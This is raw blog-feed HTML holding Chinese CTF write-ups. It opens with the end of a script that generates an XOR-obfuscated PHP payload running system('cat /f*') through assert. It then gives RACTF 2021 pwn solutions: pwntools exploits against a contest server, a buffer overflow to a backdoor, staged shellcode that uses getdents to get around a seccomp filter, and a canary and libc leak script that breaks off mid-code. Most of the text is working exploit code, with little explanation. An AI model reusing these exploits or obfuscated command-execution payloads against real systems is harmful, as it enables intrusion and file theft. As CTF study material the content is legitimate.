F_test=&#123;&#125;</span><br><span class="line">    want=<span class="string">'chr'</span></span><br><span class="line">    want=want.upper()</span><br><span class="line">    num_int=num.keys()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x in num_int:</span><br><span class="line">        <span class="keyword">for</span> y in num_int:</span><br><span class="line">                k=(chr(ord(<span class="string">'I'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> I_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     I_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">                k=(chr(ord(<span class="string">'N'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> N_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     N_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">                k=(chr(ord(<span class="string">'F'</span>)^ord(x)^ord(y)))</span><br><span class="line">                <span class="keyword">if</span> F_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     F_test[k]=(x)+<span class="string">'^'</span>+(y)</span><br><span class="line">    <span class="keyword">for</span> x in num_int:</span><br><span class="line">       </span><br><span class="line">                k=(chr(ord(<span class="string">'I'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> I_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                    I_test[k.upper()]=(x)</span><br><span class="line">                k=(chr(ord(<span class="string">'N'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> N_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                    N_test[k.upper()]=(x)</span><br><span class="line">                k=(chr(ord(<span class="string">'F'</span>)^ord(x)))</span><br><span class="line">                <span class="keyword">if</span> F_test.has_key(k)== <span class="keyword">False</span>:</span><br><span class="line">                     F_test[k.upper()]=(x)</span><br><span class="line">    <span class="keyword">if</span> I_test.has_key(want[<span class="number">0</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'I not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line">   </span><br><span class="line">           </span><br><span class="line">    <span class="keyword">if</span> N_test.has_key(want[<span class="number">1</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'N not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">if</span> F_test.has_key(want[<span class="number">2</span>])== <span class="keyword">False</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">'F not much'</span>)</span><br><span class="line">            <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#print(F_test)</span></span><br><span class="line">    <span class="keyword">return</span> chrstr(I_test[want[<span class="number">0</span>]],N_test[want[<span class="number">1</span>]],F_test[want[<span class="number">2</span>]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def guess(want):</span><br><span class="line">    <span class="keyword">global</span> int_num</span><br><span class="line">    want=str(ord(want))</span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i in want:</span><br><span class="line">        ret+=int_num[i]+<span class="string">'.'</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret[:<span class="number">-1</span>]</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">def shell(fun,code):<span class="comment">#有参数函数</span></span><br><span class="line">    ret=<span class="string">''</span></span><br><span class="line">    sym=[<span class="string">'('</span>,<span class="string">'^'</span>,<span class="string">'.'</span>,<span class="string">')'</span>]</span><br><span class="line">    <span class="keyword">global</span> chr_str</span><br><span class="line">    <span class="keyword">for</span> i in fun:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(i)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line">    ret=<span class="string">"("</span>+ret[:<span class="number">-1</span>]+<span class="string">')(('</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> x in code:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(x)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">    ret=ret[:<span class="number">-1</span>]+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">def code(xx):<span class="comment">#无差数函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> x in xx:</span><br><span class="line">        </span><br><span class="line">            ret+=chr_str+<span class="string">'('</span>+guess(x)+<span class="string">').'</span></span><br><span class="line">            </span><br><span class="line"></span><br><span class="line">    ret=ret[:<span class="number">-1</span>]+<span class="string">'))'</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    num=init()</span><br><span class="line">    int_num=one_num(num)</span><br><span class="line">    chr_str=guess_chr()</span><br><span class="line">    x=(shell(<span class="string">'assert'</span>,<span class="string">'system("cat /f*")'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>(x)</span><br><span class="line">    <span class="keyword">print</span>(len(x))</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>勉强完成出解题的脚本，但是一直在思考一个问题.在高版本php中,assert和eval是不可作为可变函数的,那么还有没有什么方法来进行代码执行.</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ractf2021-pwn-ctf</title>
      <link href="/2021/08/17/ractf2021-pwn-ctf/"/>
      <url>/2021/08/17/ractf2021-pwn-ctf/</url>
      
        <content type="html"><![CDATA[<p>周末小打了下ractf,get 到了一些 小姿势,于是小记下避免搞忘了。<a id="more"></a></p><h2 id="archer"><a href="#archer" class="headerlink" title="archer"></a>archer</h2><p>简单的变量覆盖…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'archer'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">49723</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p.sendline(<span class="string">'yes1'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'-fbf98'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="ret2winrars"><a href="#ret2winrars" class="headerlink" title="ret2winrars"></a>ret2winrars</h2><p>签到，elf内自带后门。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'./ret2winrars'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">30527</span>)</span><br><span class="line"><span class="comment">#process(elf)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="number">0x20</span>*<span class="string">'1'</span>+<span class="string">'2'</span>*<span class="number">8</span>+p64(<span class="number">0x000000000401166</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="notsimple"><a href="#notsimple" class="headerlink" title="notsimple"></a>notsimple</h2><p>很有意思的一道题,flag是文件名，同时seccomp 禁用execve所以无法使用命令执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A &#x3D; arch</span><br><span class="line"> 0001: 0x15 0x00 0x0b 0xc000003e  if (A !&#x3D; ARCH_X86_64) goto 0013</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A &#x3D; sys_number</span><br><span class="line"> 0003: 0x35 0x09 0x00 0x40000000  if (A &gt;&#x3D; 0x40000000) goto 0013</span><br><span class="line"> 0004: 0x15 0x08 0x00 0x0000003b  if (A &#x3D;&#x3D; execve) goto 0013</span><br><span class="line"> 0005: 0x15 0x07 0x00 0x00000142  if (A &#x3D;&#x3D; execveat) goto 0013</span><br><span class="line"> 0006: 0x15 0x06 0x00 0x00000101  if (A &#x3D;&#x3D; openat) goto 0013</span><br><span class="line"> 0007: 0x15 0x05 0x00 0x00000003  if (A &#x3D;&#x3D; close) goto 0013</span><br><span class="line"> 0008: 0x15 0x04 0x00 0x00000055  if (A &#x3D;&#x3D; creat) goto 0013</span><br><span class="line"> 0009: 0x15 0x03 0x00 0x00000086  if (A &#x3D;&#x3D; uselib) goto 0013</span><br><span class="line"> 0010: 0x15 0x02 0x00 0x00000039  if (A &#x3D;&#x3D; fork) goto 0013</span><br><span class="line"> 0011: 0x15 0x01 0x00 0x0000003a  if (A &#x3D;&#x3D; vfork) goto 0013</span><br><span class="line"> 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0013: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>但是经过查阅资料后发现，<code>ls</code>的底层是依赖系统调用<code>getdents</code>.</p><p>所以我们可以<code>getdents</code>系统来读取文件目录.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line">e=ELF(<span class="string">'./notsimple'</span>)</span><br><span class="line"><span class="comment">#p=process('./notsimple')</span></span><br><span class="line">p=remote(<span class="string">'193.57.159.27'</span>,<span class="number">46343</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Oops, I'm leaking!"</span>)</span><br><span class="line">addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line"></span><br><span class="line">addr2=addr+<span class="number">0x400</span></span><br><span class="line">shell=asm(<span class="string">"""</span></span><br><span class="line"><span class="string">mov rsi,  %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x800;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rax,%s;</span></span><br><span class="line"><span class="string"> jmp rax;</span></span><br><span class="line"><span class="string">"""</span>%(hex(addr2),hex(addr2)))</span><br><span class="line">print(len(shell))</span><br><span class="line"></span><br><span class="line">p.sendline(shell+(<span class="number">0x50</span>-len(shell))*<span class="string">'1'</span>+p64(<span class="number">0</span>)+p64(addr))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">addr3=addr+<span class="number">0x1000</span></span><br><span class="line">shell2=asm(<span class="string">"""</span></span><br><span class="line"><span class="string">mov rsi,  %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x80;</span></span><br><span class="line"><span class="string"> mov rdi, 0x0;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x0;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rsi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x8;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string">  mov rdi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x0;</span></span><br><span class="line"><span class="string"> mov rsi, 0x10000;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x2;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string">mov rdi, rax ;// fd</span></span><br><span class="line"><span class="string">mov rsi, %s ;// buf</span></span><br><span class="line"><span class="string">mov edx, 1024 ;// count</span></span><br><span class="line"><span class="string">mov rax, 78 ;// SYS_getdents</span></span><br><span class="line"><span class="string"> syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> mov rsi, %s;</span></span><br><span class="line"><span class="string"> mov rdx, 0x680;</span></span><br><span class="line"><span class="string"> mov rdi, 0x1;</span></span><br><span class="line"><span class="string"> mov r10, 0x0;</span></span><br><span class="line"><span class="string"> mov rax, 0x1;</span></span><br><span class="line"><span class="string"> syscall;</span></span><br><span class="line"><span class="string"> mov rdi, 0 ;// exit</span></span><br><span class="line"><span class="string">mov rax, 60;</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">"""</span>%(hex(addr3),hex(addr3),hex(addr3),hex(addr3),hex(addr3)))</span><br><span class="line"></span><br><span class="line">p.sendline(shell2)</span><br><span class="line">sleep(<span class="number">3</span>)</span><br><span class="line">p.sendline(<span class="string">'/pwn\x00'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="guessing"><a href="#guessing" class="headerlink" title="guessing"></a>guessing</h2><p>有意思的一道题,在我们只有8次猜中数字的机会但是我们要猜出canary和libc基地址，一共16个数字。</p><p>我们可以通过<code>256== 2**8</code>的特性在7次猜测下大概在通过大小推理出任意一个数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guss</span><span class="params">(nums)</span>:</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    depth = <span class="number">0</span></span><br><span class="line">    addition = <span class="number">0</span></span><br><span class="line">    count=<span class="number">0</span></span><br><span class="line">    canary2=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">        <span class="comment">#print('my_guess: '+str(my_guess))</span></span><br><span class="line">        depth += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> my_guess&lt;nums[i]:</span><br><span class="line">            <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">                my_guess += <span class="number">1</span></span><br><span class="line">                canary2 += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">                print(<span class="string">'low get!'</span>+str(my_guess))</span><br><span class="line">                <span class="comment">#print(hex(canary))</span></span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                depth = <span class="number">0</span></span><br><span class="line">                addition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">elif</span> my_guess&gt;nums[i]:</span><br><span class="line">            <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">                my_guess -= <span class="number">1</span></span><br><span class="line">                canary2 += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment"># print(hex(canary))</span></span><br><span class="line">                print(<span class="string">'high get!'</span>+str(my_guess))</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                depth = <span class="number">0</span></span><br><span class="line">                addition = <span class="number">0</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            canary2 += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            print(<span class="string">'samlle get!'</span>+str(my_guess))</span><br><span class="line">            <span class="comment">#print('one true')</span></span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">8</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n=[<span class="number">111</span>,<span class="number">34</span>,<span class="number">155</span>,<span class="number">33</span>,<span class="number">23</span>,<span class="number">55</span>,<span class="number">32</span>,<span class="number">90</span>]</span><br><span class="line"></span><br><span class="line">guss(n)</span><br></pre></td></tr></table></figure><p>从而在8次内尽可能得到16位数字。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#target = process('./guess')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">target=process(<span class="string">'./guess'</span>)<span class="comment">#remote('193.57.159.27', 55206)</span></span><br><span class="line">elf = ELF(<span class="string">'./guess'</span>)</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">c = CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">c.srand((c.time(<span class="number">0</span>)))</span><br><span class="line">x=[]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    k=c.rand()</span><br><span class="line">    k=k%<span class="number">255</span></span><br><span class="line">    x.append(k)</span><br><span class="line">    print(hex(k))</span><br><span class="line">print(x)</span><br><span class="line">i = <span class="number">1</span></span><br><span class="line">depth = <span class="number">0</span></span><br><span class="line">addition = <span class="number">0</span></span><br><span class="line">canary = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(target.recvuntil(<span class="string">b'(0-7)?'</span>))</span><br><span class="line">    target.sendline(str(<span class="number">0x20</span> + i).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    print(target.recvuntil(<span class="string">b'guess:'</span>))</span><br><span class="line">    my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">    <span class="comment">#print(hex(my_guess))</span></span><br><span class="line">    target.sendline(str(my_guess).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    result = target.recvuntil(<span class="string">b'Which'</span>)</span><br><span class="line">    depth += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'low'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess += <span class="number">1</span></span><br><span class="line">            canary += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b'high'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess -= <span class="number">1</span></span><br><span class="line">            canary += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">           <span class="comment"># print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        canary += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">        <span class="comment">#print(hex(canary))</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        addition = <span class="number">0</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(<span class="string">'one true'</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">8</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(canary)</span><br><span class="line"><span class="comment">#target.interactive()</span></span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">depth = <span class="number">0</span></span><br><span class="line">addition = <span class="number">0</span></span><br><span class="line">libc_start = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(target.recvuntil(<span class="string">b'(0-7)?'</span>))</span><br><span class="line">    target.sendline(str(<span class="number">0x30</span> + i).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    print(target.recvuntil(<span class="string">b'guess:'</span>))</span><br><span class="line">    my_guess = <span class="number">0x100</span> // <span class="number">2</span> + addition</span><br><span class="line">    <span class="comment">#print(hex(my_guess))</span></span><br><span class="line">    target.sendline(str(my_guess).encode(<span class="string">'ascii'</span>))</span><br><span class="line">    result = target.recvuntil(<span class="string">b'Which'</span>)</span><br><span class="line">    depth += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'low'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess += <span class="number">1</span></span><br><span class="line">            libc_start += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">            <span class="comment">#print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">b'high'</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">if</span> depth == <span class="number">7</span>:</span><br><span class="line">            my_guess -= <span class="number">1</span></span><br><span class="line">            libc_start += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">           <span class="comment"># print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc_start += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">        <span class="comment">#print(hex(canary))</span></span><br><span class="line">        i += <span 